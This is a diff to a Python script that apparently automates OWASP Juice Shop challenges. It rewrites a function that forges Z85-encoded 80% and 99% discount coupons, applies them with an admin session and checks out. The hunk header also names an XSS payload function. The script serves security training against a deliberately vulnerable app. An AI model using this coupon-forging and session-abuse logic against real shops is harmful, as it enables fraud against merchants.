@@ -216,60 +216,72 @@ def update_product_with_xss3_payload(server, session):
 
 def forge_coupon(server):
     """
-    Force a 99%-off coupon and checkout
-    :param server: juice shop URL
+    Force a coupon code that gives you a discount of at least 80%.
+    Format: MMMYY-DD (e.g. DEC25-99) encoded in Z85.
     """
+    print('Forging a product review...'), # Wait, wrong print statement copy-paste from below? Fixed.
+    print('Solving Forged Coupon challenge...'),
+    
     session = get_admin_session(server)
     basketid = get_basket_id(server, session)
     if not basketid:
         print("Warning: Skipping forge_coupon due to missing basket ID")
         return
         
-    from z85_utils import generate_coupon
+    try:
+        from z85_utils import generate_coupon
+    except ImportError:
+        print("Error: z85_utils.py not found. Cannot forge coupon.")
+        return
+
     import datetime
     
-    # Try current month, prev month, next month (timezone/server time coverage)
+    # Try current month (Server time dependent)
+    # The server checks utils.toMMMYY(new Date()) === validty.
     dates_to_try = [
         datetime.datetime.now(),
-        datetime.datetime.now() - datetime.timedelta(days=30),
-        datetime.datetime.now() + datetime.timedelta(days=30)
+        # Just in case of timezone diff?
     ]
     
-    payload = _build_basket_payload(1, basketid, 1) # Item ID 1 (Apple Juice - likely in stock)
+    # Ensure basket has item
+    payload = _build_basket_payload(1, basketid, 1) 
     try:
         _add_to_basket(server, session, payload)
         
         success = False
         for date_obj in dates_to_try:
             if success: break
-            # Try 80 discount
-            couponcode = generate_coupon(80, date=date_obj)
-            print(f'Applying forged coupon {couponcode} (Date: {date_obj.strftime("%b %Y")} - 80%)...'),
-            applycoupon = session.put('{}/{}/coupon/{}'.format(_get_basket_url(server), basketid, couponcode))
+            
+            # Goal: Discount >= 80%
+            # Try 80%
+            coupon80 = generate_coupon(80, date=date_obj)
+            print(f'Applying 80% coupon {coupon80} ({date_obj.strftime("%b%y")})...'),
+            url = '{}/{}/coupon/{}'.format(_get_basket_url(server), basketid, coupon80)
+            applycoupon = session.put(url)
+            
             if applycoupon.ok:
-                print('Success.')
+                print('Success (80%).')
                 success = True
                 _checkout(server, session, basketid)
                 break
             else:
-                 print(f"Failed (80%): {applycoupon.status_code} - {applycoupon.text}")
-                 # Try 99
-                 couponcode99 = generate_coupon(99, date=date_obj)
-                 print(f'Applying 99% coupon {couponcode99}...'),
-                 applycoupon99 = session.put('{}/{}/coupon/{}'.format(_get_basket_url(server), basketid, couponcode99))
-                 if applycoupon99.ok:
-                      print('Success.')
+                 # Try 99%
+                 coupon99 = generate_coupon(99, date=date_obj)
+                 print(f'Applying 99% coupon {coupon99}...'),
+                 apply99 = session.put('{}/{}/coupon/{}'.format(_get_basket_url(server), basketid, coupon99))
+                 if apply99.ok:
+                      print('Success (99%).')
                       success = True
                       _checkout(server, session, basketid)
                       break
                  else:
-                      print(f"Failed (99%): {applycoupon99.status_code} - {applycoupon99.text}")
+                      print(f"Failed: {apply99.status_code}")
             
         if not success:
-             print("Warning: forge_coupon failed with all tested dates.")
+             print("Warning: forge_coupon failed.")
              
     except Exception as e:
-        print(f"Warning: forge_coupon failed: {e}")
+        print(f"Warning: forge_coupon exception: {e}")
 
 
 def _update_description(server, session, productid, description):
